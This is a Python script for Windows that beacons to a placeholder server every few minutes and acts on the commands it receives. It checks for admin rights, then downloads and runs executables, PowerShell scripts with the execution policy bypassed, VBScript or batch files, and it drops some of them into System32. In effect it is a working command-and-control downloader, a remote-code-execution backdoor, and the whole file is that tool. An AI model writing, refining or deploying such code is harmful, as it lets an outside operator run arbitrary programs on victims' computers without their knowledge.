import os
import time
import logging
import requests
from datetime import datetime
import ctypes
import subprocess

# Constants
LOG_DIR = r'c:\MSPS'
LOG_FILE_PATH = os.path.join(LOG_DIR, 'MSPS_log.txt')
TEMP_DIR = os.getenv('TEMP', r'C:\Temp')
SYSTEM32_DIR = r'C:\Windows\System32'
URL = 'http://example.com/api'  # Replace with the actual URL to call

# Set up logging
#logging.basicConfig(filename=LOG_FILE_PATH, level=logging.INFO, format='%(asctime)s - %(message)s')

def log_message(message):
    logging.info(message)

def ensure_directory_exists(directory_path):
    if not os.path.exists(directory_path):
        try:
            os.makedirs(directory_path)
            log_message(f'Directory created: {directory_path}')
        except Exception as e:
            log_message(f'Error creating directory {directory_path}: {e}')

def check_admin_privileges():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception as e:
        log_message(f'Error checking admin privileges: {e}')
        return False

def download_file(url, destination):
    try:
        response = requests.get(url, stream=True)
        response.raise_for_status()
        with open(destination, 'wb') as file:
            for chunk in response.iter_content(chunk_size=8192):
                file.write(chunk)
        return True
    except Exception as e:
        log_message(f'Error downloading file from {url}: {e}')
        return False

def execute_file(file_path):
    try:
        result = subprocess.run([file_path], check=True, capture_output=True, text=True)
        log_message(f'Execution result of {file_path}: {result.stdout}')
    except Exception as e:
        log_message(f'Error executing file {file_path}: {e}')

def run_powershell_script(file_path):
    try:
        result = subprocess.run(['powershell', '-ExecutionPolicy', 'Bypass', '-File', file_path], check=True, capture_output=True, text=True)
        log_message(f'Execution result of PowerShell script {file_path}: {result.stdout}')
    except Exception as e:
        log_message(f'Error executing PowerShell script {file_path}: {e}')

def run_vbscript(file_path):
    try:
        result = subprocess.run(['cscript', file_path], check=True, capture_output=True, text=True)
        log_message(f'Execution result of VBScript {file_path}: {result.stdout}')
    except Exception as e:
        log_message(f'Error executing VBScript {file_path}: {e}')

def run_batch_file(file_path):
    try:
        result = subprocess.run([file_path], check=True, shell=True, capture_output=True, text=True)
        log_message(f'Execution result of batch file {file_path}: {result.stdout}')
    except Exception as e:
        log_message(f'Error executing batch file {file_path}: {e}')

def main():
    ensure_directory_exists(LOG_DIR)
    log_message('Script started')

    while True:
        try:
            response = requests.get(URL)
            response.raise_for_status()
            data = response.json()

            command = data.get('command')
            file_url = data.get('path')
            time_to_execute = data.get('timetoexecute')
            go_to_sleep = data.get('gotosleep')

            if command:
                log_message(f'Successful call at {datetime.now()}')
                
                file_name = os.path.basename(file_url)
                temp_file_path = os.path.join(TEMP_DIR, file_name)

                if command == '0':
                    is_admin = check_admin_privileges()
                    result = '1' if is_admin else '0'
                    log_message(f'Admin check result: {result}')

                elif command == '1':
                    if download_file(file_url, temp_file_path):
                        execute_file(temp_file_path)
                        log_message(f'Executed executable file {temp_file_path}')

                elif command == '2':
                    if download_file(file_url, temp_file_path):
                        run_powershell_script(temp_file_path)
                        log_message(f'Executed PowerShell script {temp_file_path}')

                elif command == '3':
                    if download_file(file_url, temp_file_path):
                        run_vbscript(temp_file_path)
                        log_message(f'Executed VBScript {temp_file_path}')

                elif command == '4':
                    if download_file(file_url, temp_file_path):
                        run_batch_file(temp_file_path)
                        log_message(f'Executed batch file {temp_file_path}')

                elif command == '5' or command == '6':
                    destination_dir = SYSTEM32_DIR if command == '5' or command == '6' else TEMP_DIR
                    destination_path = os.path.join(destination_dir, file_name)
                    
                    if download_file(file_url, destination_path):
                        execute_file(destination_path)
                        log_message(f'Executed file {destination_path}')

                        if command == '6':
                            log_message('Command 6 detected, stopping script.')
                            break

                if time_to_execute:
                    time.sleep(int(time_to_execute))
                else:
                    time.sleep(300)  # Sleep for 5 minutes if `timetoexecute` is null

        except Exception as e:
            log_message(f'Exception encountered: {e}')
            time.sleep(300)  # Wait 5 minutes before retrying

if __name__ == '__main__':
    main()
